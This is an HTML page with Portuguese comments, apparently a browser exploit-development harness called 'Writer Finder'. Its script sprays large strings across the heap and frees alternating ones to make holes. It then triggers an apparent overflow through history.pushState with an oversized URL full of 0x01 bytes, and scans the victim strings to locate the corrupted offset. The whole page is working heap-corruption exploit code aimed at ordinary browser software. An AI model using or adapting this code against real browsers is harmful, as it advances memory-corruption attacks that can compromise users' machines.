<!DOCTYPE html>
<html>
<head>
    <title>Writer Finder (Onde está o 0x01?)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .hit { color: yellow; font-weight: bold; }
    </style>
</head>
<body>

    <h1>Writer Finder</h1>
    <p>Procurando onde os bytes 0x01 estão caindo dentro da string de 1MB.</p>

    <button onclick="startFinder()">INICIAR BUSCA</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const CURRENT_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 128; // Aumentei para 128KB para garantir que suje tudo

        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'hit' ? 'class="hit"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startFinder() {
            log(`Iniciando com Offset ${CURRENT_OFFSET}...`);
            
            victims = [];
            await forceGC();

            try {
                // 1. SPRAY "B"
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                const SPRAY_COUNT = 60; 
                for(let i=0; i<SPRAY_COUNT; i++) {
                    // Sem prefixo numérico para facilitar a busca, só "B"
                    // Mas precisamos de algo para evitar deduplicação...
                    // Vamos colocar o índice no FINAL
                    let s = baseString.substring(0, PAYLOAD_SIZE - 10) + "_IDX_" + i;
                    victims.push(s);
                }

                // 2. Buracos
                for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                await forceGC();

                // 3. EXPLOIT
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(CURRENT_OFFSET);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "finder", "/" + buffer);

                        log("Escaneando strings por 0x01...");
                        scanForBytes();

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function scanForBytes() {
            let foundAny = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // Procura o primeiro byte 0x01
                    let firstIndex = -1;
                    // Checagem rápida em blocos
                    for(let k=0; k<1000; k++) {
                        if (msg.charCodeAt(k) === 1) {
                            firstIndex = k;
                            break;
                        }
                    }

                    if (firstIndex !== -1) {
                        log(`!!! ENCONTRADO !!! String ${i} tem 0x01 no índice ${firstIndex}`, 'hit');
                        log(`Isso significa que precisamos RECUAR ${firstIndex} bytes!`, 'hit');
                        foundAny = true;
                        alert("ALVO LOCALIZADO!");
                        break;
                    }
                    
                    // Se o tamanho mudou
                    if (msg.length !== PAYLOAD_SIZE) {
                        log(`!!! JACKPOT !!! Length mudou na String ${i}!`, 'hit');
                        foundAny = true;
                        break;
                    }

                } catch(e) {}
            }
            if(!foundAny) log("Nenhum 0x01 encontrado nos primeiros 1000 bytes das vítimas.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
